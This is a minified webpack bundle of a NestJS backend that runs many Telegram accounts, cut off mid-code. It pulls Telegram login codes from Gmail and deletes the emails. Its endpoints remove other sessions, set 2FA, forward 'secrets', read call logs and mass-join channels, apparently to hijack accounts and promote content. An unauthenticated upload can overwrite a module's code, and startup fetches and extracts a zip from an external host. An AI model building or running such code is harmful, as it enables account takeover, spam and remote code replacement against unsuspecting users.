(()=>{"use strict";var e={8383:function(e,t,o){var i=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.MailReader=void 0;const r=i(o(2559)),n=o(6185);class a{constructor(){this.isReady=!1,this.result="",this.imap=new r.default({user:process.env.GMAIL_ADD,password:process.env.GMAIL_PASS,host:"imap.gmail.com",port:993,tls:!0,tlsOptions:{rejectUnauthorized:!1}}),this.imap.on("ready",(()=>{console.log("Mail is Ready"),this.isReady=!0})),this.imap.on("error",(e=>{console.error("SomeError:",e),this.isReady=!1})),this.imap.on("end",(()=>{console.log("Connection ended"),this.isReady=!1}))}static getInstance(){return a.instance||(a.instance=new a),a.instance}async connectToMail(){console.log("Connecting to mail server");try{this.imap.connect(),this.isReady=!0,console.log("Connected to mail server")}catch(e){throw console.error("Error connecting to mail server:",(0,n.parseError)(e)),e}}async disconnectFromMail(){console.log("Disconnecting from mail server");try{this.imap.end(),this.isReady=!1,console.log("Disconnected from mail server")}catch(e){throw console.error("Error disconnecting from mail server:",(0,n.parseError)(e)),e}}async isMailReady(){return this.isReady}async getCode(){console.log("MailReady : ",this.isReady),this.isReady||(console.log("Re-Connecting mail server"),await this.connectToMail(),await(0,n.sleep)(1e4));try{await this.openInbox();const e=[["FROM","noreply@telegram.org"]],t={bodies:["HEADER","TEXT"],markSeen:!0};console.log("Inbox Opened");const o=await new Promise(((t,o)=>{this.imap.search(e,((e,i)=>{e?(console.error("Search error:",(0,n.parseError)(e)),o(e)):t(i)}))}));if(o.length>0){console.log("Emails found:",o.length);const e=o.length,i=this.imap.fetch([o[e-1]],t);await new Promise(((t,r)=>{i.on("message",((i,a)=>{const s=[];i.on("body",((e,t)=>{let o="";e.on("data",(e=>o+=e.toString("utf8"))),e.on("end",(()=>{"TEXT"===t.which&&s.push(o),this.imap.seq.addFlags([a],"\\Deleted",(e=>{e&&r(e),this.imap.expunge((e=>{e&&r(e),console.log("Deleted message")}))}))}))})),i.once("end",(()=>{console.log(`Email #${a}, Latest ${o[e-1]}`),console.log("EmailDataLength:",s.length),console.log("Mail:",s[s.length-1].split(".")),this.result=(0,n.fetchNumbersFromString)(s[s.length-1].split(".")[0]),t()}))})),i.once("end",(()=>{console.log("Fetched mails"),t()}))}))}else console.log("No new emails found");return console.log("Returning result:",this.result),this.result}catch(e){throw console.error("Error:",e),this.isReady=!1,e}}async openInbox(){await new Promise(((e,t)=>{this.imap.openBox("INBOX",!1,(o=>{o?(console.error("Open Inbox error:",(0,n.parseError)(o)),t(o)):(console.log("Inbox opened"),e())}))}))}}t.MailReader=a},6509:function(e,t,o){var i,r=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},a=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.AppController=void 0;const s=o(3563),c=o(2918),l=o(9556),p=o(9742),d=o(9896),u=o(8461),f=o(6928);let y=class{constructor(e){this.appService=e}getHello(){return this.appService.getHello()}async uploadFileAndUpdate(e){try{const t=(0,f.join)(__dirname,"..","node_modules","commonService","dist"),o=(0,f.join)(t,"index.js");(0,d.existsSync)(t)||(0,d.mkdirSync)(t,{recursive:!0});const i=await d.promises.readFile(e.path);return await d.promises.writeFile(o,i),console.log("commonService/index.js updated successfully."),{message:"commonService/index.js updated successfully"}}catch(e){throw console.error("Failed to update commonService/index.js:",e),e}}};t.AppController=y,r([(0,s.Get)(),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",String)],y.prototype,"getHello",null),r([(0,s.Post)("updateCommonService"),(0,s.UseInterceptors)((0,l.FileInterceptor)("file",{storage:(0,u.diskStorage)({destination:(e,t,o)=>{try{const e=(0,f.join)(__dirname,"..","uploads");(0,d.existsSync)(e)||(0,d.mkdirSync)(e,{recursive:!0}),o(null,e)}catch(e){o(e,null)}},filename:(e,t,o)=>{o(null,"index.js")}})})),(0,p.ApiOperation)({summary:"Upload a file to update commonService index.js"}),(0,p.ApiConsumes)("multipart/form-data"),(0,p.ApiBody)({schema:{type:"object",properties:{file:{type:"string",format:"binary"}}}}),a(0,(0,s.UploadedFile)()),n("design:type",Function),n("design:paramtypes",["function"==typeof(i=void 0!==u.File&&u.File)?i:Object]),n("design:returntype",Promise)],y.prototype,"uploadFileAndUpdate",null),t.AppController=y=r([(0,s.Controller)(),n("design:paramtypes",[c.AppService])],y)},3205:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.AppModule=void 0;const r=o(3563),n=o(7422),a=o(6158),s=o(8009),c=o(282),l=o(8421),p=o(3322),d=o(6061),u=o(5774),f=o(1324),y=o(6509),m=o(2918),h=o(3924),g=o(3177),v=o(7106),w=o(5014),b=o(4181),P=o(5471),S=o(3085),C=o(1373),A=o(886),O=o(9605),M=o(889);let R=class{configure(e){e.apply(h.LoggerMiddleware).forRoutes("*")}};t.AppModule=R,t.AppModule=R=i([(0,r.Module)({imports:[u.initModule,c.TelegramModule,p.ActiveChannelsModule,s.ClientModule,a.UserDataModule,n.UsersModule,l.BufferClientModule,d.ArchivedClientModule,f.ChannelsModule,C.PromoteClientModule,g.BuildModule,v.UpiIdModule,w.PromoteMsgModule,S.PromoteStatModule,b.StatModule,P.Stat2Module,A.TgSignupModule,O.TransactionModule,M.NpointModule],controllers:[y.AppController],providers:[m.AppService],exports:[c.TelegramModule,p.ActiveChannelsModule,s.ClientModule,a.UserDataModule,n.UsersModule,l.BufferClientModule,d.ArchivedClientModule,f.ChannelsModule,C.PromoteClientModule,A.TgSignupModule,O.TransactionModule]})],R)},2918:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.AppService=void 0;const r=o(3563);let n=class{getHello(){return"Hello World!"}};t.AppService=n,t.AppService=n=i([(0,r.Injectable)()],n)},6790:function(e,t,o){var i,r=this&&this.__createBinding||(Object.create?function(e,t,o,i){void 0===i&&(i=o);var r=Object.getOwnPropertyDescriptor(t,o);r&&!("get"in r?!t.__esModule:r.writable||r.configurable)||(r={enumerable:!0,get:function(){return t[o]}}),Object.defineProperty(e,i,r)}:function(e,t,o,i){void 0===i&&(i=o),e[i]=t[o]}),n=this&&this.__setModuleDefault||(Object.create?function(e,t){Object.defineProperty(e,"default",{enumerable:!0,value:t})}:function(e,t){e.default=t}),a=this&&this.__importStar||(i=function(e){return i=Object.getOwnPropertyNames||function(e){var t=[];for(var o in e)Object.prototype.hasOwnProperty.call(e,o)&&(t[t.length]=o);return t},i(e)},function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var o=i(e),a=0;a<o.length;a++)"default"!==o[a]&&r(t,e,o[a]);return n(t,e),t}),s=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.CloudinaryService=void 0,console.log("in Cloudinary");const c=a(o(1416)),l=a(o(6928)),p=a(o(9896)),d=o(6185),u=s(o(4650));class f{constructor(){this.resources=new Map,c.v2.config({cloud_name:process.env.CL_NAME,api_key:process.env.CL_APIKEY,api_secret:process.env.CL_APISECRET})}static async getInstance(e){return f.instance||(f.instance=new f),await f.instance.getResourcesFromFolder(e),f.instance}async downloadAndExtractZip(e){const t=process.cwd(),o=l.resolve(t,"temp.zip"),i=l.resolve(t);console.log(`Starting download of zip file from ${e}`);const r=await(0,d.fetchWithTimeout)(e,{responseType:"arraybuffer"});if(200!==r?.status){const t=`Unable to download zip file from ${e}`;throw console.error(t),new Error(t)}{console.log("Zip file downloaded successfully."),p.writeFileSync(o,r.data),console.log(`Zip file saved to ${o}`);const e=new u.default(o);console.log(`Extracting zip file to ${i}`),e.extractAllTo(i,!0),console.log("Zip file extracted successfully."),p.unlinkSync(o),console.log(`Temporary zip file ${o} deleted.`)}}async getResourcesFromFolder(e){console.log("FETCHING NEW FILES!! from CLOUDINARY"),await this.downloadAndExtractZip(`https://promoteClients2.glitch.me/folders/${e}/files/download-all`)}async createNewFolder(e){await this.createFolder(e),await this.uploadFilesToFolder(e)}async overwriteFile(){try{const e=await c.v2.uploader.upload("./src/test.js",{resource_type:"auto",overwrite:!0,invalidate:!0,public_id:"index_nbzca5.js"});console.log(e)}catch(e){(0,d.parseError)(e)}}async findAndSaveResources(e,t){try{const{resources:o}=await c.v2.api.resources({resource_type:t,type:"upload",prefix:e,max_results:500});await Promise.all(o.map((async e=>{try{this.resources.set(e.public_id.split("/")[1].split("_")[0],e.url),await async function(e,t){try{const o=e.substring(e.lastIndexOf(".")+1),i=process.cwd(),r=l.join(i,`${t}.${o}`);console.log(r);const n=await(0,d.fetchWithTimeout)(e,{responseType:"arraybuffer"},2);if("OK"!==n?.statusText)throw new Error(`Unable to download file from ${e}`);p.existsSync(r)?(p.unlinkSync(r),p.writeFileSync(r,n.data,"binary"),console.log(`${t}.${o} Replaced!!`)):(p.writeFileSync(r,n.data,"binary"),console.log(`${t}.${o} Saved!!`))}catch(e){(0,d.parseError)(e)}}(e.url,e.public_id.split("/")[1].split("_")[0])}catch(t){console.log(e),(0,d.parseError)(t)}})))}catch(e){(0,d.parseError)(e)}}async createFolder(e){try{return await c.v2.api.create_folder(e)}catch(e){throw console.error("Error creating folder:",e),e}}async uploadFilesToFolder(e){const t=Array.from(this.resources.entries()).map((async([t,o])=>{try{return await c.v2.uploader.upload_large(o,{folder:e,resource_type:"auto",public_id:t})}catch(e){throw console.error("Error uploading file:",e),e}}));try{return await Promise.all(t)}catch(e){throw console.error("Error uploading files:",e),e}}async printResources(){try{this.resources?.forEach(((e,t)=>{console.log(t,":",e)}))}catch(e){(0,d.parseError)(e)}}get(e){try{return this.resources.get(e)||""}catch(e){(0,d.parseError)(e)}}getBuffer(e){try{return this.resources.get(e)||""}catch(e){console.log(e)}}}t.CloudinaryService=f},5691:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.ConfigurationSchema=t.Configuration=void 0;const n=o(5839),a=r(o(6037));let s=class{};t.Configuration=s,t.Configuration=s=i([(0,n.Schema)({versionKey:!1,autoIndex:!0,strict:!1,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],s),t.ConfigurationSchema=n.SchemaFactory.createForClass(s),t.ConfigurationSchema.add({type:a.default.Schema.Types.Mixed})},7902:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ConfigurationController=void 0;const a=o(3563),s=o(9742),c=o(6759);let l=class{constructor(e){this.configurationService=e}async findOne(){return this.configurationService.findOne()}async update(e){return this.configurationService.update(e)}};t.ConfigurationController=l,i([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get configuration data"}),r("design:type",Function),r("design:paramtypes",[]),r("design:returntype",Promise)],l.prototype,"findOne",null),i([(0,a.Patch)(),(0,s.ApiOperation)({summary:"Update configuration"}),(0,s.ApiBody)({type:Object}),n(0,(0,a.Body)()),r("design:type",Function),r("design:paramtypes",[Object]),r("design:returntype",Promise)],l.prototype,"update",null),t.ConfigurationController=l=i([(0,s.ApiTags)("Configuration"),(0,a.Controller)("configuration"),r("design:paramtypes",[c.ConfigurationService])],l)},5774:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.initModule=void 0;const a=o(3563),s=o(3428),c=o(5839),l=o(6759),p=o(5691),d=o(7902),u=o(6037),f=o(6185);let y=class{constructor(e){this.connection=e}async onModuleInit(){console.log(`Started :: ${process.env.clientId}`),await(0,f.fetchWithTimeout)(`${(0,f.ppplbot)()}&text=${encodeURIComponent(`Started :: ${process.env.clientId}`)}`)}async onModuleDestroy(){console.log("Init Module Destroying"),await(0,f.fetchWithTimeout)(`${(0,f.ppplbot)()}&text=${encodeURIComponent(`closed :: ${process.env.clientId}`)}`),this.closeConnection()}closeConnection(){console.log("Closing mongoose connection"),this.connection.close(!0)}};t.initModule=y,t.initModule=y=i([(0,a.Global)(),(0,a.Module)({imports:[s.ConfigModule.forRoot(),c.MongooseModule.forRootAsync({useFactory:()=>({uri:process.env.mongouri})}),c.MongooseModule.forFeature([{name:"configurationModule",collection:"configuration",schema:p.ConfigurationSchema}])],providers:[l.ConfigurationService],controllers:[d.ConfigurationController],exports:[s.ConfigModule,c.MongooseModule]}),n(0,(0,a.Inject)((0,c.getConnectionToken)())),r("design:paramtypes",[u.Connection])],y)},6759:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},r=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},n=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ConfigurationService=void 0;const a=o(3563),s=o(5839),c=o(6037);let l=class{constructor(e){this.configurationModel=e,this.setEnv()}async OnModuleInit(){console.log("Config Module Inited")}async findOne(){const e=await this.configurationModel.findOne({}).exec();if(!e)throw new a.NotFoundException("configurationModel not found");return e}async setEnv(){console.log("Setting Envs");const e={...await this.configurationModel.findOne({},{_id:0})};for(const t in e)console.log("setting",t),process.env[t]=e[t];console.log("finished setting env")}async update(e){delete e._id;const t=await this.configurationModel.findOneAndUpdate({},{$set:{...e}},{new:!0,upsert:!0}).exec();if(!t)throw new a.NotFoundException("configurationModel not found");return t}};t.ConfigurationService=l,t.ConfigurationService=l=i([(0,a.Injectable)(),n(0,(0,s.InjectModel)("configurationModule")),r("design:paramtypes",[c.Model])],l)},7330:function(e,t,o){var i,r=this&&this.__createBinding||(Object.create?function(e,t,o,i){void 0===i&&(i=o);var r=Object.getOwnPropertyDescriptor(t,o);r&&!("get"in r?!t.__esModule:r.writable||r.configurable)||(r={enumerable:!0,get:function(){return t[o]}}),Object.defineProperty(e,i,r)}:function(e,t,o,i){void 0===i&&(i=o),e[i]=t[o]}),n=this&&this.__setModuleDefault||(Object.create?function(e,t){Object.defineProperty(e,"default",{enumerable:!0,value:t})}:function(e,t){e.default=t}),a=this&&this.__decorate||function(e,t,o,i){var r,n=arguments.length,a=n<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(r=e[s])&&(a=(n<3?r(a):n>3?r(t,o,a):r(t,o))||a);return n>3&&a&&Object.defineProperty(t,o,a),a},s=this&&this.__importStar||(i=function(e){return i=Object.getOwnPropertyNames||function(e){var t=[];for(var o in e)Object.prototype.hasOwnProperty.call(e,o)&&(t[t.length]=o);return t},i(e)},function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var o=i(e),a=0;a<o.length;a++)"default"!==o[a]&&r(t,e,o[a]);return n(t,e),t}),c=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},l=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.TelegramController=void 0;const p=o(3563),d=o(9742),u=o(2995),f=s(o(9896)),y=o(8062),m=o(7777);let h=class{constructor(e){this.telegramService=e}async connectToTelegram(e){return await this.telegramService.createClient(e)}async connectClient(e){return await this.connectToTelegram(e),"Client connected successfully"}async disconnect(e){return await this.telegramService.deleteClient(e)}async disconnectAll(){return await this.telegramService.disconnectAll(),"Clients disconnected successfully"}async getMessages(e,t,o=8){return await this.connectToTelegram(e),this.telegramService.getMessages(e,t,o)}async getMessagesNew(e,t,o,i=20){return await this.telegramService.createClient(e,!1,!1),await this.telegramService.getMessagesNew(e,t,o,i)}async getChatId(e,t){return await this.connectToTelegram(e),await this.telegramService.getChatId(e,t)}async sendInlineMessage(e,t,o,i){return await this.connectToTelegram(e),await this.telegramService.sendInlineMessage(e,t,o,i)}async lastActiveTime(e){return await this.connectToTelegram(e),await this.telegramService.getLastActiveTime(e)}async joinChannels(e,t){return await this.connectToTelegram(e),"Joining Channels"}async removeOtherAuths(e){return await this.connectToTelegram(e),await this.telegramService.removeOtherAuths(e),"Authorizations removed successfully"}async getSelfMsgsInfo(e){return await this.connectToTelegram(e),await this.telegramService.getSelfMsgsInfo(e)}async createGroup(e){return await this.connectToTelegram(e),await this.telegramService.createGroup(e)}async forwardSecrets(e,t){return await this.connectToTelegram(e),await this.telegramService.forwardSecrets(e,t)}async joinChannelAndForward(e,t,o){return await this.telegramService.createClient(e,!1,!1),await this.telegramService.joinChannelAndForward(e,t,o)}async leaveChannel(e,t){return await this.connectToTelegram(e),this.telegramService.leaveChannel(e,t),"Started Leaving Channels"}async getCallLog(e){return await this.connectToTelegram(e),await this.telegramService.getCallLog(e)}async getMe(e){return await this.connectToTelegram(e),await this.telegramService.getMe(e)}async getMedia(e){return await this.connectToTelegram(e),await this.telegramService.getmedia(e)}async getChannelInfo(e,t=!1){return await this.connectToTelegram(e),await this.telegramService.getChannelInfo(e,t)}async leaveChannels(e){return await this.connectToTelegram(e),this.telegramService.leaveChannels(e),"Started Leaving Channels"}async getAuths(e){return await this.connectToTelegram(e),await this.telegramService.getAuths(e)}async set2Fa(e){return await this.connectToTelegram(e),await this.telegramService.set2Fa(e)}async setProfilePic(e,t){return await this.connectToTelegram(e),await this.telegramService.setProfilePic(e,t)}async updatePrivacy(e){return await this.connectToTelegram(e),await this.telegramService.updatePrivacy(e)}async updateUsername(e,t){return await this.connectToTelegram(e),await this.telegramService.updateUsername(e,t)}async getGrpMembers(e,t){return await this.connectToTelegram(e),await this.telegramService.getGrpMembers(e,t)}async addContact(e){const{mobile:t,data:o,prefix:i}=e;return await this.connectToTelegram(t),this.telegramService.addContact(t,o,i)}async addContacts(e){const{mobile:t,phoneNumbers:o,prefix:i}=e;return await this.connectToTelegram(t),this.telegramService.addContacts(t,o,i)}async newSession(e){return await this.connectToTelegram(e),await this.telegramService.createNewSession(e)}async updateName(e,t,o){return await this.connectToTelegram(e),await this.telegramService.updateNameandBio(e,t,o)}async getMediaMetadata(e,t,o,i){return await this.telegramService.createClient(e,!1,!1),this.telegramService.getMediaMetadata(e,t,o,i)}async downloadMediaFile(e,t,o,i){await this.connectToTelegram(e),await this.telegramService.downloadMediaFile(e,t,o,i)}async downloadProfilePic(e,t,o){await this.connectToTelegram(e);try{const i=await this.telegramService.downloadProfilePic(e,t);if(!i)return o.status(404).send("Profile photo not found.");o.download(i,"profile_pic.jpg",(e=>{e&&(console.error("Error sending the file:",e),o.status(500).send("Error downloading the file.")),f.unlink(i,(e=>{e&&console.error("Error deleting the file:",e)}))}))}catch(e){console.error("Error in endpoint:",e),o.status(500).send("An error occurred.")}}async forrward(e,t,o){return await this.connectToTelegram(e),await this.telegramService.forwardMessage(e,t,o)}async deleteChat(e,t){return await this.connectToTelegram(e),await this.telegramService.deleteChat(e,t)}async deleteProfilePics(e){return await this.connectToTelegram(e),await this.telegramService.deleteProfilePhotos(e)}};t.TelegramController=h,a([(0,p.Get)("connect/:mobile"),(0,d.ApiOperation)({summary:"Create and connect a new Telegram client"}),(0,d.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),l(0,(0,p.Param)("mobile")),c("design:type",Function),c("design:paramtypes",[String]),c("design:returntype",Promise)],h.prototype,"connectClient",null),a([(0,p.Get)("disconnect/:mobile"),(0,d.ApiOperation)({summary:"Create and connect a new Telegram client"}),(0,d.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),l(0,(0,p.Param)("mobile")),c("design:type",Function),c("design:paramtypes",[String]),c("design:returntype",Promise)],h.prototype,"disconnect",null),a([(0,p.Get)("disconnectAll"),(0,d.ApiOperation)({summary:"Create and connect a new Telegram client"}),c("design:type",Function),c("design:paramtypes",[]),c("design:returntype",Promise)],h.prototype,"disconnectAll",null),a([(0,p.Get)("messages/:mobile"),(0,d.ApiOperation)({summary:"Get messages from Telegram"}),(0,d.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,d.ApiQuery)({name:"username",description:"Username to fetch messages from",required:!0}),(0,d.ApiQuery)({name:"limit",description:"Limit the number of messages",required:!1}),l(0,(0,p.Param)("mobile")),l(1,(0,p.Query)("username")),l(2,(0,p.Query)("limit")),c("design:type",Function),c("design:paramtypes",[String,String,Number]),c("design:returntype",Promise)],h.prototype,"getMessages",null),a([(0,p.Get)("messagesNew/:mobile"),(0,d.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,d.ApiQuery)({name:"chatId",description:"Username to fetch messages from",required:!0}),(0,d.ApiQuery)({name:"limit",description:"Limit the number of messages",required:!1}),(0,d.ApiQuery)({name:"offset",description:"offset the number of messages",required:!1}),l(0,(0,p.Param)("mobile")),l(1,(0,p.Query)("chatId")),l(2,(0,p.Query)("offset")),l(3,(0,p.Query)("limit")),c("design:type",Function),c("design:paramtypes",[String,String,Number,Number]),c("design:returntype",Promise)],h.prototype,"getMessagesNew",null),a([(0,p.Get)("chatid/:mobile"),(0,d.ApiOperation)({summary:"Get chat ID for a username"}),(0,d.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,d.ApiQuery)({name:"username",description:"Username to fetch chat ID for",required:!0}),l(0,(0,p.Param)("mobile")),l(1,(0,p.Query)("username")),c("design:type",Function),c("design:paramtypes",[String,String]),c("design:returntype",Promise)],h.prototype,"getChatId",null),a([(0,p.Get)("sendInlineMessage/:mobile"),(0,d.ApiOperation)({summary:"Get chat ID for a username"}),(0,d.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,d.ApiQuery)({name:"chatId",description:"chat ID of user",required:!0}),(0,d.ApiQuery)({name:"message",description:"message ID of user",required:!0}),(0,d.ApiQuery)({name:"url",description:"url ID of user",required:!0}),l(0,(0,p.Param)("mobile")),l(1,(0,p.Query)("chatId")),l(2,(0,p.Query)("message")),l(3,(0,p.Query)("url")),c("design:type",Function),c("design:paramtypes",[String,String,String,String]),c("design:returntype",Promise)],h.prototype,"sendInlineMessage",null),a([(0,p.Get)("lastActiveTime/:mobile"),(0,d.ApiOperation)({summary:"Get Last Active time of a user"}),(0,d.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),l(0,(0,p.Param)("mobile")),c("design:type",Function),c("design:paramtypes",[String]),c("design:returntype",Promise)],h.prototype,"lastActiveTime",null),a([(0,p.Post)("joinchannels/:mobile"),(0,d.ApiOperation)({summary:"Join channels"}),(0,d.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,d.ApiBody)({description:"Channels string",schema:{type:"object",properties:{channels:{type:"string"}}}}),l(0,(0,p.Param)("mobile")),l(1,(0,p.Body)("channels")),c("design:type",Function),c("design:paramtypes",[String,String]),c("design:returntype",Promise)],h.prototype,"joinChannels",null),a([(0,p.Get)("removeauths/:mobile"),(0,d.ApiOperation)({summary:"Remove other authorizations"}),(0,d.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),l(0,(0,p.Param)("mobile")),c("design:type",Function),c("design:paramtypes",[String]),c("design:returntype",Promise)],h.prototype,"removeOtherAuths",null),a([(0,p.Get)("selfmsgsinfo/:mobile"),(0,d.ApiOperation)({summary:"Get self messages info"}),(0,d.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),l(0,(0,p.Param)("mobile")),c("design:type",Function),c("design:paramtypes",[String]),c("design:returntype",Promise)],h.prototype,"getSelfMsgsInfo",null),a([(0,p.Get)("createGroup/:mobile"),(0,d.ApiOperation)({summary:"Get self messages info"}),(0,d.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),l(0,(0,p.Param)("mobile")),c("design:type",Function),c("design:paramtypes",[String]),c("design:returntype",Promise)],h.prototype,"createGroup",null),a([(0,p.Get)("forwardSecrets/:mobile/:fromId"),(0,d.ApiOperation)({summary:"Get self messages info"}),(0,d.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),l(0,(0,p.Param)("mobile")),l(1,(0,p.Param)("fromId")),c("design:type",Function),c("design:paramtypes",[String,String]),c("design:returntype",Promise)],h.prototype,"forwardSecrets",null),a([(0,p.Get)("joinChannelAndForward/:mobile/:fromId/:channel"),(0,d.ApiOperation)({summary:"Get self messages info"}),(0,d.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),l(0,(0,p.Param)("mobile")),l(1,(0,p.Param)("fromId")),l(2,(0,p.Param)("channel")),c("design:type",Function),c("design:paramtypes",[String,String,String]),c("design:returntype",Promise)],h.prototype,"joinChannelAndForward",null),a([(0,p.Get)("leaveChannel/:mobile/:channel"),(0,d.ApiOperation)({summary:"Get channel info"}),(0,d.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),l(0,(0,p.Param)("mobile")),l(1,(0,p.Param)("channel")),c("design:type",Function),c("design:paramtypes",[String,String]),c("design:returntype",Promise)],h.prototype,"leaveChannel",null),a([(0,p.Get)("getCallLog/:mobile"),(0,d.ApiOperation)({summary:"Get CallLog  info"}),(0,d.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),l(0,(0,p.Param)("mobile")),c("design:type",Function),c("design:paramtypes",[String]),c("design:returntype",Promise)],h.prototype,"getCallLog",null),a([(0,p.Get)("getMe/:mobile"),(0,d.ApiOperation)({summary:"Get me  info"}),(0,d.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),l(0,(0,p.Param)("mobile")),c("design:type",Function),c("design:paramtypes",[String]),c("design:returntype",Promise)],h.prototype,"getMe",null),a([(0,p.Get)("getMedia/:mobile"),(0,d.ApiOperation)({summary:"Get me  info"}),(0,d.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),l(0,(0,p.Param)("mobile")),c("design:type",Function),c("design:paramtypes",[String]),c("design:returntype",Promise)],h.prototype,"getMedia",null),a([(0,p.Get)("channelinfo/:mobile"),(0,d.ApiOperation)({summary:"Get channel info"}),(0,d.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),(0,d.ApiQuery)({name:"sendIds",description:"Whether to send IDs or not",required:!1}),l(0,(0,p.Param)("mobile")),l(1,(0,p.Query)("sendIds")),c("design:type",Function),c("design:paramtypes",[String,Boolean]),c("design:returntype",Promise)],h.prototype,"getChannelInfo",null),a([(0,p.Get)("leaveChannels/:mobile"),(0,d.ApiOperation)({summary:"Get channel info"}),(0,d.ApiParam)({name:"mobile",description:"Mobile number",required:!0}),l(0,(0,p.Param)("mobile")),c("design:type",Function),c("design:paramtypes",[String]),c("design:returntype",Promise)],h.prototype,"leaveChannels",null),a([(0,p.Get)("auths/:mobile"),(0,d.ApiOperation)({summary:"Get authorizations"}),(0,d.ApiParam)({name:"mobile",description:"Mobile 